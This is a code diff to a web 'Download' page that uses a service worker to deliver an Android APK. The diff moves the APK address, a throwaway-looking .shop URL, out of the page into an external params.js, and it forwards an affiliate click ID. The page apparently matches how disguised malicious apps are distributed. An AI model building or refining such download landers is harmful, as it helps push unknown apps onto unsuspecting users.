@@ -5,11 +5,13 @@
   <meta name="google" content="notranslate">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Download</title>
+  <script src="../params.js?v=l1-2"></script>
   <script>
-    window.__downloadTestRevision = 'l1-1';
+    window.__downloadTestRevision = 'l1-2';
     window.__downloadSwVersion = 'b623f123';
     window.__downloadSwUrl = `../sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
     window.__swReadyPromise = (async () => {
+      await window.__landingParamsReady;
       if (!('serviceWorker' in navigator)) {
         return { ok: false, direct: true, reason: 'unsupported' };
       }
@@ -23,7 +25,8 @@
 
       await navigator.serviceWorker.ready;
 
-      if (!navigator.serviceWorker.controller) {
+      const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
+      if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
         await new Promise((resolve, reject) => {
           const timeout = window.setTimeout(() => {
             navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
@@ -31,11 +34,13 @@
           }, 5000);
 
           function onControllerChange() {
+            if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
+            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
             window.clearTimeout(timeout);
             resolve();
           }
 
-          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange, { once: true });
+          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
         });
       }
 
@@ -265,8 +270,7 @@
     const clickArea = document.querySelector('#clickArea');
     const fileTitle = document.querySelector('#fileTitle');
 
-    const pageUrl = new URL(window.location.href);
-    const apkUrl = 'https://inhumancrieck.shop/9d9e87dbccdbfa9715d/';
+    let apkUrl = null;
     const fileName = DEFAULT_FILE_NAME;
     let isServiceWorkerReady = false;
     let isDirectDownloadMode = false;
@@ -283,11 +287,13 @@
 
     function getRedirectUrl() {
       const target = new URL(REDIRECT_HREF);
-      target.searchParams.set('clickid', pageUrl.searchParams.get('clickid') || '');
+      target.searchParams.set('clickid', window.__savedDownloadParams.get('clickid') || '');
       return target.href;
     }
 
     async function registerServiceWorker() {
+      await window.__landingParamsReady;
+      apkUrl = window.__savedApkUrl;
       const swState = await window.__swReadyPromise;
 
       if (!swState.ok || swState.direct) {
